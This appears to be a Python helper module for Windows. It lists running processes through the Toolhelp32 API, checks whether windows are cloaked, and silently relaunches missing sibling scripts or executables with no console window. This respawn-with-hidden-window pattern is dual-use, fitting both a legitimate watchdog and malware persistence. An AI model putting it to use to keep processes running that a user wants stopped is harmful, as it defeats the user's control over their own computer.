import os
import ctypes
from ctypes import wintypes
import subprocess

TH32CS_SNAPPROCESS = 2
DWMWA_CLOAKED = 14

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", ctypes.c_char * 260)
    ]

def is_window_cloaked(hwnd):
    cloaked = wintypes.DWORD()
    try:
        res = ctypes.windll.dwmapi.DwmGetWindowAttribute(
            hwnd, 
            DWMWA_CLOAKED, 
            ctypes.byref(cloaked), 
            ctypes.sizeof(cloaked)
        )
        if res == 0:
            return bool(cloaked.value)
    except Exception:
        pass
    return False

def get_running_exes():
    kernel32 = ctypes.windll.kernel32
    CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
    Process32First = kernel32.Process32First
    Process32Next = kernel32.Process32Next
    CloseHandle = kernel32.CloseHandle

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if hProcessSnap == -1:
        return set()

    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
    
    exes = set()
    if Process32First(hProcessSnap, ctypes.byref(pe32)):
        while True:
            try:
                exe_name = pe32.szExeFile.decode('mbcs').lower()
                exes.add(exe_name)
            except:
                pass
            if not Process32Next(hProcessSnap, ctypes.byref(pe32)):
                break
    CloseHandle(hProcessSnap)
    return exes

def ensure_processes_running(base_dir, my_filename, targets):
    try:
        exes = get_running_exes()
        
        for script_name, exe_name in targets:
            if script_name == my_filename:
                continue
            
            exe_basename = os.path.basename(exe_name)
            if exe_basename.lower() not in exes:
                script_path = os.path.join(base_dir, script_name)
                if script_name.endswith('.exe'):
                    subprocess.Popen([exe_name], creationflags=0x08000000, cwd=base_dir)
                else:
                    subprocess.Popen([exe_name, script_path], creationflags=0x08000000, cwd=base_dir)
    except Exception as e:
        print(f"Error in ensure_processes_running: {e}")
